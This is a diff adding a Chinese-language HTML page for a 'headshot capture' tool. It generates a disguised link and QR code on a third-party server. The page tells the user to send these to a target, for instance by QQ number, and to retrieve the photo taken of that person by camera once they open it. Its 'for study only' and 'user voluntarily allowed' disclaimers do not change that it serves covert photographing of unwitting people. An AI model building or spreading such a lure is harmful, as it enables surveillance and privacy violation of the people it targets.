@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>大头照获取</title>
+  <link href="https://lib.baomitu.com/twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://lib.baomitu.com/jquery/1.12.4/jquery.min.js"></script>
+  <script src="https://lib.baomitu.com/layer/3.1.1/layer.js"></script>
+  <link rel="stylesheet" href="https://lib.baomitu.com/layer/3.1.1/theme/default/layer.css?v=3.1.1" id="layuicss-layer">
+  <script>
+    function gg() {
+      layer.alert('\n仅供学习交流，如作他用所承受的法律责任一概与作者无关！\n使用即代表同意上述观点！', {
+        icon: 1,
+        title: '公告',
+        skin: 'layer-ext-moon'
+      })
+    }
+
+    function create() {
+      var input = document.getElementById('content');
+      var kd = document.getElementById('kd');
+      var qr = document.getElementById('qr');
+      var myid = document.getElementById('myid');
+      var url = document.getElementById('myurl');
+      var s_url = "https://mirror.xcadmin.com";
+      if (myid.value == "" || url.value == "") {
+        swal("ID或跳转地址不能为空！");
+        return false;
+      }
+      // 假设这里定义了str_encode函数，例如：
+      function str_encode(str) {
+        return encodeURIComponent(str);
+      }
+      var qr_res = s_url + "/index/photo/id/" + myid.value + "/url/" + str_encode(url.value);
+      var qr_url = "https://collect.xmwxxc.com/collect/qrcode/?type=base64&data=" + qr_res;
+      $.ajax({
+        url: qr_url,
+        dataType: "html",
+        type: "post",
+        success: function (data) {
+          //alert(JSON.stringify(data));
+          //var obj = JSON.parse(data);
+          //alert(data);
+          qr.innerHTML = "<img src='" + data + "'>";
+        }
+      });
+      kd.href = "https://mirror.xcadmin.com/index/photo.html?id=" + myid.value + '&url=' + url.value;
+      kd.style = '';
+      kd.innerText = "https://mirror.xcadmin.com/index/photo.html?id=" + myid.value + '&url=' + url.value;
+    }
+
+    function dialog(code, exit) {
+      layer.open({
+        type: 1,
+        skin: 'layui-layer-lan',
+        area: ['350px', ''],
+        closeBtn: exit,
+        shade: 0.8,
+        title: '0000',
+        btnAlign: 'c',
+        content: code
+      });
+    }
+
+    window.onload = function () {
+      gg();
+    }
+  </script>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RT13NSRESZ"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+    gtag('config', 'G-RT13NSRESZ');
+  </script>
+</head>
+
+<body background="https://s2.loli.net/2025/01/12/rIXQz61nf3RVvpt.jpg" style="background-repeat:no-repeat; background-size:100% 100%; background-attachment:fixed;">
+  <div class="container">
+    <div class="col-xs-12 col-sm-10 col-md-8 col-lg-6 center-block" style="float: none;">
+      <br>
+      <div class="panel panel-primary">
+        <div class="panel-heading" style="background: linear-gradient(to right, #b221ff, #14b7ff, #8ae68a);">
+          <center><h3 class="panel-title">大头照获取</h3></center>
+        </div>
+        <div class="panel-body" style="text-align: center;">
+          <div class="list-group">
+            <div class="list-group-item list-group-item-warning" style="font-weight: bold;">
+              <span>使用教程</span>
+            </div>
+            <div class="list-group-item list-group-item-info" style="font-weight: bold;">
+              <input class="form-control" type="text" id="myid" placeholder="请输入ID（后续查看照片凭证）" value='' />
+            </div>
+            <div class="list-group-item list-group-item-info" style="font-weight: bold;">
+              <input class="form-control" type="text" id="myurl" placeholder="请输入跳转地址，例：https://www.baidu.com" value='' />
+            </div>
+            <div class="list-group-item list-group-item-warning" style="font-weight: bold;">
+              <span><a id="kd" style="pointer-events: none;">先【生成链接】，对方打开链接后凭ID可【查看照片】！</a></span>
+            </div>
+            <div class="list-group-item">
+              <a onclick='create();' class="btn btn-block btn-primary" style="background: linear-gradient(to right, #b221ff, #14b7ff);">生成链接</a>
+              <br>
+              <input type="button" class="btn btn-primary btn-block" value='查看照片' onclick="window.location.href='https://mirror.xcadmin.com/index/ck.html?id=' + document.getElementById('myid').value">
+              <input type="button" class="btn btn-primary btn-block" value='删除照片' onclick="window.location.href='https://mirror.xcadmin.com/index/ck.html?type=dell&id=' + document.getElementById('myid').value">
+              <br>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="panel panel-default text-center">
+        <div class="panel-body">
+          ©&nbsp;2023-2025&nbsp;&nbsp;<a>FY STUDIO</a>
+          <br>
+          <div id="result"></div>
+        </div>
+      </div>
+    </div>
+    <div class="panel panel-primary" style="margin: 1% 1% 1% 1%; background: rgba(255, 251, 251, 0.7)">
+      <div class="panel-body">
+        <div class="alert alert-info" role="alert">
+          <br>作者声明:
+          <br>1.本工具仅做学习交流使用,请勿用于非法用途!后果自负!网站拍照是用户自愿点击允许的！
+          <br>2.凭证是查看照片的凭证,不要泄露给知道这个平台的人
+          <br>3.如有侵权、肖像权等,请联系本站下方客服删除！
+          <br>使用说明:
+          <br>1.填写对方QQ或自己知道的数字+英文字母方便日后查询!填写完成后不用管直接点击生成!
+          <br>2.生成完成后,复制链接(短地址)或二维码发给你要查询的人
+          <br>3.他点开后,然后回到本站,填写对方QQ,然后点击查看照片即可！
+          <br>4.由于系统安全机制，ios系统必须使用自带的Safari浏览器（或者第三方APP调用的是Safari内核）才行
+          <br>仅供娱乐使用,请勿用于非法商业用途,否则后果自负！
+          <br>站长邮箱:syteamq311@gmail.com
+          <br>本站由日月星辰工作室（FY STUDIO）提供技术支持
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
